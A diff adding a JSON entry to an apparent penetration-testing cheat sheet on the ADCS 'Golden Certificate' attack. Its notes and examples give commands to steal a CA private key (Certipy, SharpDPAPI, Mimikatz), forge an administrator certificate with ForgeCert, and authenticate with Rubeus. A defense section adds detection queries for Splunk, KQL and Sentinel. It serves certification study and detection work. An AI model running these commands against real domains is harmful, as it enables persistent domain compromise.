@@ -1,0 +1,103 @@
+{
+  "id": "ad-forgecert",
+  "name": "ForgeCert - Golden Certificate (Stolen CA Key)",
+  "command": "ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword <pass> --Subject \"CN=Administrator,CN=Users,DC=<domain_short>,DC=local\" --SubjectAltName administrator@<domain> --NewCertPath admin.pfx --NewCertPassword <pass>",
+  "description": "ForgeCert forges certificates using a stolen CA private key (the \"Golden Certificate\" attack - DPERSIST1). With the CA cert and key, you can create certificates for ANY user, bypassing all template restrictions. This is the certificate equivalent of a Golden Ticket - persistent domain compromise until the CA key is rotated.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Active Directory",
+  "subcategory": "Persistence",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "CRTP ADCS persistence; GhostPack/ForgeCert",
+  "tags": [
+    "forgecert",
+    "golden-certificate",
+    "adcs",
+    "persistence",
+    "dpersist1",
+    "ca-key"
+  ],
+  "mitre": [
+    "T1649",
+    "T1556.006"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== STEP 1: STEAL THE CA KEY ===\n  # From the CA server (requires local admin on CA):\n  # Option A - Certipy (Linux)\n  certipy ca -backup -ca <ca_name> -u administrator@<domain> -p <pass>\n  # Option B - SharpDPAPI (Windows)\n  SharpDPAPI.exe certificates /machine\n  # Option C - Mimikatz\n  crypto::capi\n  crypto::certificates /export /systemstore:LOCAL_MACHINE\n\n=== STEP 2: FORGE CERTIFICATE ===\n  ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword \"password\" --Subject \"CN=Administrator,CN=Users,DC=corp,DC=local\" --SubjectAltName administrator@corp.local --NewCertPath admin.pfx --NewCertPassword \"password\"\n\n=== STEP 3: AUTHENTICATE ===\n  # Rubeus (Windows)\n  Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:password /ptt\n  # Certipy (Linux)\n  certipy auth -pfx admin.pfx -dc-ip <dc_ip>\n\n=== PERSISTENCE VALUE ===\nCA certificates typically have 5+ year lifetimes. A stolen CA key\nallows forging certs until the CA is rebuilt from scratch.\nPassword resets do NOT invalidate forged certificates.",
+  "examples": [
+    {
+      "label": "Forge admin certificate with stolen CA key",
+      "command": "ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword \"password\" --Subject \"CN=Administrator,CN=Users,DC=corp,DC=local\" --SubjectAltName administrator@corp.local --NewCertPath admin.pfx --NewCertPassword \"password\""
+    },
+    {
+      "label": "Backup CA key with Certipy",
+      "command": "certipy ca -backup -ca corp-CA -u administrator@corp.local -hashes :<hash>"
+    },
+    {
+      "label": "Authenticate with forged certificate",
+      "command": "Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:password /ptt"
+    }
+  ],
+  "references": [
+    {
+      "title": "ForgeCert - GhostPack",
+      "url": "https://github.com/GhostPack/ForgeCert"
+    },
+    {
+      "title": "SpecterOps - Certified Pre-Owned",
+      "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-esc1-certipy-linux",
+      "note": "ESC1 gets initial cert abuse; ForgeCert is post-compromise persistence.",
+      "rel": "prereq"
+    },
+    {
+      "id": "crtp-adcs-esc1",
+      "note": "Certipy-based ESC1 exploitation leads to ForgeCert for persistence.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The CA private key is the root of trust for all certificates. With it, any certificate can be forged with arbitrary SANs, bypassing template and enrollment restrictions entirely.",
+    "prerequisites": "Local admin on the CA server to extract the CA private key and certificate.",
+    "impact": "Persistent domain compromise; forged certificates survive password resets and remain valid for years.",
+    "detection": "[MITRE T1649] Certificates issued outside normal ADCS enrollment (no corresponding 4886/4887 events); Certipy/Rubeus PKINIT auth with unexpected certificates.",
+    "artifacts": "Missing Event 4886/4887 (certificate request/issue) for the forged cert; Event 4768 with certificate-based pre-auth; CA private key access logs.",
+    "splunk_spl": "index=windows EventCode=4768 PreAuthType=16\n| eval cert_auth=\"PKINIT\"\n| join TargetUserName [search index=windows EventCode=4887 | stats count by TargetUserName]\n| where isnull(count)\n| table _time, TargetUserName, IpAddress",
+    "elastic_kql": "event.code:\"4768\" AND winlog.event_data.PreAuthType:\"16\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4768 and PreAuthType == \"16\"\n| project TimeGenerated, TargetUserName, IpAddress, ServiceName",
+    "sigma_rules": "win_security_golden_certificate_pkinit",
+    "prevention": "Protect CA private key with HSM; monitor CA backup operations; audit 4768 events with PKINIT pre-auth; implement certificate transparency logging.",
+    "sources": [
+      "CRTP ADCS module",
+      "https://attack.mitre.org/techniques/T1649/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Golden Certificate - PKINIT auth without matching issuance",
+        "logic": "let pkinit_auths = SecurityEvent\n| where EventID == 4768 and PreAuthType == \"16\"\n| project AuthTime=TimeGenerated, TargetUserName, IpAddress;\nlet cert_issues = SecurityEvent\n| where EventID == 4887\n| project IssueTime=TimeGenerated, RequesterName;\npkinit_auths\n| join kind=leftanti (cert_issues) on $left.TargetUserName == $right.RequesterName\n| project AuthTime, TargetUserName, IpAddress",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4768",
+          "4887"
+        ],
+        "attack": [
+          "T1649",
+          "T1556.006"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Smart card authentication with pre-provisioned certificates",
+        "tuning": "Correlate with ADCS enrollment logs; whitelist known smart card users"
+      }
+    ]
+  }
+}
